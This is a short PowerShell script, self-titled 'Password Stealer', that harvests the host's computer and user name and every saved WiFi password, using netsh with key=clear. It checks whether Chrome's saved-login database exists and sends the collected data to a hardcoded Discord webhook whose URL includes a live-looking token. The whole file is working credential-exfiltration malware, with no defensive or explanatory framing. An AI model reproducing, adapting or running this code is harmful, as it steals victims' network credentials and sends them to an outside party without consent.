# Discord Webhook
$webhook = "https://discord.com/api/webhooks/1467172875529228422/3X57JscpSXinJkZzei7XYF1JVmRx6hfSzMGx9PXOgC0Aawp4fIeN1E37Bd4OAfSJIGO0"

# Get computer info
$pc = "$env:COMPUTERNAME | $env:USERNAME"

# === WiFi Passwords ===
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
$wifi = ""
foreach($name in $wifiProfiles) {
    $profileInfo = netsh wlan show profile name="$name" key=clear
    $passLine = $profileInfo | Select-String "Key Content\W+\:(.+)$"
    if($passLine) {
        $pass = $passLine.Matches.Groups[1].Value.Trim()
        $wifi += "$name : $pass`n"
    }
}
if(-not $wifi) { $wifi = "No saved WiFi networks found" }

# === Chrome Passwords ===
$chrome = ""
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if(Test-Path $chromePath) {
    $chrome = "Chrome: Encrypted (requires advanced decryption - check manually)"
} else {
    $chrome = "Chrome: Not installed"
}

# === Format output ===
$output = @"
**PC: $pc**

**=== WiFi Networks ===**
$wifi

**=== Chrome Passwords ===**
$chrome
"@

# === Send to Discord ===
$body = @{
    content = $output
    username = "Password Stealer"
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
